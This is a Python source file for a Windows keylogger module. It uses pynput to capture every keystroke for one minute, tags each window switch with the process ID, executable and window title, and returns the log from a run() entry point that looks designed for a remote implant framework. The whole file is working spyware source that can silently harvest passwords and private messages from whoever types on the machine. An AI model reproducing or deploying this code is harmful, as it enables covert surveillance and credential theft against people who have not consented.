from ctypes import byref, create_string_buffer, c_long, windll
import threading
from pynput import keyboard
from io import StringIO
import time

TIMEOUT = 60  # 1 minute

class Keylogger:
    def __init__(self):
        self.current_window_handle = None
        self.log = StringIO()

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_long(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid.value)
        windll.psapi.GetModuleBaseNameA(h_process, None, executable, 512)

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, window_title, 512)

        try:
            window_name = window_title.value.decode()
        except UnicodeDecodeError:
            window_name = "Unknown"

        info = f'\n[PID: {pid.value}] {executable.value.decode()} - {window_name}\n'
        print(info, end='', flush=True)
        self.log.write(info)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

        self.current_window_handle = hwnd  # Save current window handle

    def mykeystroke(self, key):
        new_window = windll.user32.GetForegroundWindow()
        if new_window != self.current_window_handle:
            self.get_current_process()

        try:
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = f'[{key}]'
        except Exception as e:
            key_str = f'[Error capturing key: {e}]'

        print(key_str, end='', flush=True)
        self.log.write(key_str)

def timeout_check(listener, start_time, timeout):
    while time.time() - start_time < timeout:
        time.sleep(1)
    listener.stop()

def run(**args):
    print("[*] In keylogger module.")
    kl = Keylogger()
    kl.get_current_process()  # Initialize first window

    start_time = time.time()

    def on_press(key):
        kl.mykeystroke(key)

    listener = keyboard.Listener(on_press=on_press)

    # Start the timeout check in a separate thread
    timeout_thread = threading.Thread(target=timeout_check, args=(listener, start_time, TIMEOUT))
    timeout_thread.start()

    listener.start()
    listener.join()

    print("value:", kl.log.getvalue())
    return kl.log.getvalue()